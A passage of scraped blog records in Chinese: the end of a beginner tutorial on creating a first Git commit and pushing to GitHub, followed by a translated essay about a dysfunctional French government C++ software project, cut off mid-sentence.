-webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\necho \"#Demo\" &gt;&gt; README.md\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ede622945361767-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ede622945361767-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ede622945361767-1\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"#Demo\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ede622945361767-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>创建一个名为 <code>README.md</code> 的文件，并写入 <code>#Demo</code>。检查文件是否创建成功，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ede625825483654\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncat README.md\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ede625825483654-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ede625825483654-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ede625825483654-1\"><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ede625825483654-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这将会为您显示 <code>README.md</code> 文件的内容，如果文件创建成功，您的终端会有如下显示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/dc452e9264aa58b7502df5c06069e24c.png\" alt=\"\"></p>\n<p>使用 Git 程序告诉您的电脑，Demo 是一个被 Git 管理的目录，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ede629081070601\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit init\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ede629081070601-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ede629081070601-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ede629081070601-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">init</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ede629081070601-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>然后，告诉 Git 程序您关心的文件并且想在此刻起跟踪它的任何改变，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ede62c832333620\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit add README.md\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ede62c832333620-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ede62c832333620-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ede62c832333620-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">md</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ede62c832333620-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_4\">步骤 4：创建一次提交</h3>\n<p>目前为止，您已经创建了一个文件，并且已经通知了 Git，现在，是时候创建一次提交commit了。提交可以看作是一个里程碑。每当完成一些工作之时，您都可以创建一次提交，保存文件当前版本，这样一来，您可以返回之前的版本，并且查看那时候的文件内容。无论何时您修改了文件，都可以对文件创建一个上一次的不一样的新版本。</p>\n<p>创建一次提交，请输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ede630771012195\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit commit -m \"first commit\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ede630771012195-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ede630771012195-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ede630771012195-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"first commit\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ede630771012195-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>就是这样！刚才您创建了包含一条注释为 “first commit” 的 Git 提交。每次提交，您都必须编辑注释信息；它不仅能协助您识别提交，而且能让您理解此时您对文件做了什么修改。这样到了明天，如果您在文件中添加新的代码，您可以写一句提交信息：“添加了新的代码”，然后当您一个月后回来查看提交记录或者 Git 日志（即提交列表），您还能知道当时的您在文件夹里做了什么。</p>\n<h3 id=\"toc_5\">步骤 5: 将您的计算机与 GitHub 仓库相连接</h3>\n<p>现在，是时候用如下命令将您的计算机连接到 GitHub 仓库了：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ede633402957891\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit remote add origin https://github.com/&lt;your_username&gt;/Demo.git\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ede633402957891-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ede633402957891-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ede633402957891-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">remote </span><span class=\"crayon-e\">add </span><span class=\"crayon-e\">origin </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/&lt;your_username&gt;/Demo.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ede633402957891-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p>让我们一步步的分析这行命令。我们通知 Git 去添加一个叫做 <code>origin</code> （起源）的，拥有地址为 <code>https://github.com/&lt;your_username&gt;/Demo.git</code>（它也是您的仓库的 GitHub 地址） 的 <code>remote</code> （远程仓库）。当您提交代码时，这允许您在 GitHub.com 和 Git 仓库交互时使用 <code>origin</code> 这个名称而不是完整的 Git 地址。为什么叫做 <code>origin</code>？当然，您可以叫点别的，只要您喜欢（惯例而已）。</p>\n<p>现在，我们已经将本地 Demo 仓库副本连接到了其在 GitHub.com 远程副本上。您的终端看起来如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/8ca11bf5cd5069c6edbc8b5081048f10.png\" alt=\"\"></p>\n<p>此刻我们已经连接到远程仓库，可以推送我们的代码 到 GitHub.com（例如上传 <code>README.md</code> 文件）。</p>\n<p>执行完毕后，您的终端会显示如下信息：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/ad6f842634493d3eb98b683488023800.png\" alt=\"\"></p>\n<p>然后，如果您访问 <code>https://github.com/&lt;your_username&gt;/Demo</code>，您会看到截图内显示的情况：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/b09c603947a63405fe70e869b60c3b34.png\" alt=\"\"></p>\n<p>就是这么回事！您已经创建了您的第一个 GitHub 仓库，连接到了您的电脑，并且从你的计算机推送（或者称：上传）一个文件到 GitHub.com 名叫 Demo 的远程仓库上了。下一次，我将编写关于 Git 复制（从 GitHub 上下载文件到你的计算机上）、添加新文件、修改现存文件、推送（上传）文件到 GitHub。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114101\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114101votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114101\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Git,Linux", "url": "http://blog.jobbole.com/114101/", "url_obj_id": "b0fe29cc0c4c89c756cfc2daf1bfe5cb"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/5f2dbd34a324b10f8f29ed12482281ae.jpg"], "title": "谁说国外的程序员过得好？法国政府搞的软件项目，坑出新境界", "create_date": "2018/04/25 ·", "praise_num": 1, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://36kr.com/p/5130755.html\">Cado</a>   </div><p>编者按：很多软件项目开发时间大大超出了规划的时间，投入大量资金和人力，都没有实在的结果。如果你讨厌你的编程工作，请认真阅读这篇 2008 年的文章吧。法国科技公司为政府做的项目，预期两三年，做了十二年还在做；6 百万行 C++ 代码，经理比工程师多，人员素质极低。</p>\n<p>几年前，我在一家法国大型科技公司工作，为他们的一个软件项目做咨询师。在那段时间，我见识到了软件工程工作方面最匪夷所思的一切，完全超乎我的想象。项目人员工作极度不专业，而更严重的是，工作环境完全无视人的尊严。我一度觉得去那里上班就像坐牢。我只要举几个例子，读者自然就有分晓。</p>\n<p><strong>工作内容</strong></p>\n<p>为一个政府部门开发一款软件。</p>\n<p>政府先付了几百万欧元的订金，软件开发耗时初定 2 到 3 年。公司雇了几个工程师，开始了项目。每隔三个月，团队人数就翻一番，以便让资金不断流入。</p>\n<p>7 年后，项目还不成样子，连雏形都没有。每天公司都要交几千欧元的罚金。于是，管理层决定节流，把经验丰富的员工都辞退了，雇了些经验少，甚至完全没经验的新人。</p>\n<p>10 年后，项目进度实在太滞后，中层管理人员决定雇佣有软件工程经验的人，把项目拉回正轨。公司的员工每三个月换一批，也就是法国离职交接期的时长。</p>\n<p>12 年后，项目还没结束。公司每天给政府发的修改申请越来越多，以“补贴”每天缴纳的罚金。此时已经是 2008 年。</p>\n<p><strong>项目数据</strong></p>\n<ul>\n<li>600 万行代码</li>\n<li>基于 C ++</li>\n<li>50,000+ 类</li>\n<li>使用的 C ++ 已经过时，“锁死”在编译器版本中，编译器的版本只能一个操作系统上用。</li>\n<li>基于 CORBA</li>\n<li>项目使用的数据库软件背后的公司已经破产</li>\n<li>图层用户界面有好几个，但实际上每一层都没人维护。</li>\n<li>32 台计算机上构建，需要 48 小时</li>\n<li>运行一个用户界面需要 40 到 50 个并行进程</li>\n<li>没有动态库链接：可执行文件大小在数百兆字节范围内</li>\n<li>启动时间约为 15 分钟</li>\n<li>瘫痪频率：每 30 秒到 30 分钟一次</li>\n</ul>\n<p>没有那个软件工程师会说 C++ 很简单。就其复杂程度而言，这或许是最难掌握的编程语言，就连创造 C++ 的几个工程师都坦白说，他们自己也没有完全掌握。</p>\n<p>这种无底洞、大迷宫似的语言，还是有不少人扬言说自己已经掌握了，只要有机会，他们就敢用给你看。他们一猛子扎进这口深井，最后大多遍体鳞伤。看着一满篇天书，花不知多少小时，也找不到瘫痪原因。人都是很聪明的，人生短暂，投入一段时间没有回报，就会“弃暗投明”，改用其他语言，改做其他项目。</p>\n<p>软件一大，不管是什么语言写的，维护起来都很难。6 百万行代码，就一个小团队维护，只要想想就能发疯。6 百万可不是小数字，就算一秒钟读一行，也要 70 天不眠不休才能看完。</p>\n<p>我再举两个实例，读者就知道这个项目有多让人崩溃。</p>\n<p>有一个开发者被分配了这样一个任务：找出在界面上点击右键，界面冻结的原因。他花了几天时间，仔仔细细检查，耗掉大半耐心之后，他发现，在界面上右击后，其实没有错误，只是内容菜单要 45 分钟后才弹出。每次用户在主窗体点击后，菜单是动态生成的，但是背后是巨量的静态内容，因此耗时长。有些用户反馈说“加载 CD”的命令完全没反应。这个问题花了几个星期才弄明白，但是最后，错误报告却被标记为“已解决”，因为数据确实有加载，只不过是花了整整 7 天，才加载完 700 兆的数据。嗯，不然怎么说耐心是美德呢…</p>\n<p><strong>版本控制，犹如脱缰野马</strong></p>\n<p>好几年过去了，团队里终于来了个人才，提出要用版本控制工具。第一次尝试，效果不如人意，于是团队决定换一个系统。又过了纪念，每次更新的历史数据全没了。最后，他们选择使用一个瑞士的系统，图形用户界面简直不堪入目。有一个四人小组全职负责版本控制软件方面的维护问题，跟他们合作，我们常常面临以下的问题：</p>\n<ul>\n<li>第一次测试需要与版本控制团队先预约时间，通常在一周后才授权。</li>\n<li>未经中层管理人员授权，不允许编辑文件。必须事先告诉经理要编辑哪些文件，然后申请上级许可，再预约版本控制团队，在几天后才能编辑。</li>\n<li>每次修改代码都会产生分支文件，也就意味着必须合并所有修改。有了这么多的文件，你可能觉得，不会出现两个人弄同一个文件上的重复劳动。但事实证明，大家都在弄同样的 100 个文件。</li>\n<li>检入过程非常痛苦，这个过程中，你的代码经过自动化错误检测软件审查，最终由中间管理人员审查。不用说，bug 的出现速度永远比开发人员纠正速度快得多。如果你仔细看注册的错误数量，每次修正导致的新 bug 数量，是原来 bug 数量的两倍。</li>\n<li>版本控制很简单。旧软件是版本1，目前的软件是版本2，未来的软件是版本 3. 没有人知道哪个版本已经交付给客户了。</li>\n</ul>\n<p>从前的某一天，公司安排过正式交付。但是这个时间不是团队内的人定的。那天，客户受到了一张没有内容，只有安装指引的光盘。那时因为，没有人知道怎么把这个项目做出来。后来客户发现他们受到的光盘里，什么也没有，于是给公司发了封正式的投诉信。</p>\n<p>公司居然把旧版本的软件发给了客户。客户之所以能发现，是因为他们看了“说明”栏，里面的内容跟上一年的版本大同小异。</p>\n<p><strong>“人件”</strong></p>\n<p><strong>微薄薪水，只能雇庸碌之辈</strong></p>\n<p>团队里大部分人都是没有软件工程经验的人，软件里要不是大部分都是 bug，就奇了怪了。经理意识到，一个单纯的软件项目，支出的大头是薪水，真是天资聪颖。但是，这个大发现丝毫没有影响 TA 炒掉工程师，不论他们有没有经验，却把桌面上有“C++傻瓜入门”之类书的管理人员统统留下了。</p>\n<p><strong>我们的梦想团队</strong></p>\n<p>团队 55 人：20 个开发者，35 个管理人员</p>\n<p>没错，管理人员数量比工程师还多。</p>\n<p>管理人员最擅长的就是开会，讲的都是同一个 PPT，一遍又一遍，讲到吐为止。而开发者就在宽敞的共用办公空间里聊天解闷。</p>\n<p>很多管理人员在软件工程上毫无经验。当时 SCO-Linux 争议炒得沸沸扬扬，不管整件事算不算闹剧，很多人都意识到，以后要用自由软件都要付费了。）不用说，整个软件到处都是 GNU C 库里的代码，一个巨型 GNU 兼容的非共享软件。但是，就这个项目的水准，估计也没人敢把代码放出去。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/5f2dbd34a324b10f8f29ed12482281ae.jpg\" alt=\"谁说国外的程序员过得好？法国政府搞的软件项目，坑出新境界\"></p>\n<blockquote><p>自由软件（free software），根据自由软件基金会对其的定义，是一类可以不受限制地自由使用、复制、研究、修改和分发的，尊重用户自由的软件。这方面的不受限制正是自由软件最重要的本质，与自由软件相对的是专有软件（proprietary software），或被称为私有软件、封闭软件（其定义与是否收取费用无关──自由软件不一定是免费软件。</p></blockquote>\n<p>整个团队，技术水平不如人意，了解互联网的人屈指可数，其中自认为了解互联网的，以为互联网只是为爱情动作片而生的。他们之间，如果有人说自己在网上看了点东西，听者就会露出会心一笑。</p>\n<p><strong>地狱之旅</strong></p>\n<p>本来在这里的工作，虽然不算优越，至少不会无聊。但是顶层的管理人员非要采用纳粹管理集中营的办法来管理员工。我随便举几个例子：</p>\n<ul>\n<li>早九点后到岗是不允许的。有一天， 经理站在大门后，把 9 